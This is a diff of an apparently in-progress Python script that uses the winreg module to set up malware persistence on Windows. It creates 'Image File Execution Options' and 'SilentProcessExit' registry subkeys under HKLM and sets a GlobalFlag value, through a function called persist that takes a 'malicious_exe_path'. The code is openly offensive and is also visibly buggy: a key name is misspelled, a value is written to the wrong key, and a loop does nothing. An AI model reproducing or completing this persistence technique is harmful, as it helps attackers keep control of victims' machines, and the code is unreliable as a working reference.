@@ -14,6 +14,7 @@ from winreg import (
   OpenKey,
   SetValueEx,
   EnumValue,
+  EnumKey,
   QueryInfoKey,
   CreateKeyEx,
   KEY_ALL_ACCESS,
@@ -34,7 +35,6 @@ from sys import argv
 target_reg_keys = (
   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit",
-  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"
 )
 
 def flush_registry_changes():
@@ -51,11 +51,18 @@ def flush_registry_changes():
 
 def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
   with ConnectRegistry(None, HKEY_LOCAL_MACHINE) as hklm:
+    # create the `Image File Execution Options` subkey with target executable
+    CreateKeyEx(hklm, target_reg_keys[0], 0, KEY_WRITE)
     # create the `SilentProcessExit` subkey with target executable
     CreateKeyEx(hklm, target_reg_keys[1], 0, KEY_WRITE)
     for reg_key in target_reg_keys:
       with OpenKey(hklm, reg_key, 0, KEY_ALL_ACCESS) as target_key:
-        print(QueryInfoKey(target_key))        
+        for i in range(QueryInfoKey(target_key)[0]):
+          if "Image File Exection" in reg_key:
+            SetValueEx(hklm, "GlobalFlag", 0, REG_DWORD, 512)
+            pass
+          else:
+            pass
 
 if __name__ == "__main__":
   target_exe = argv[1]
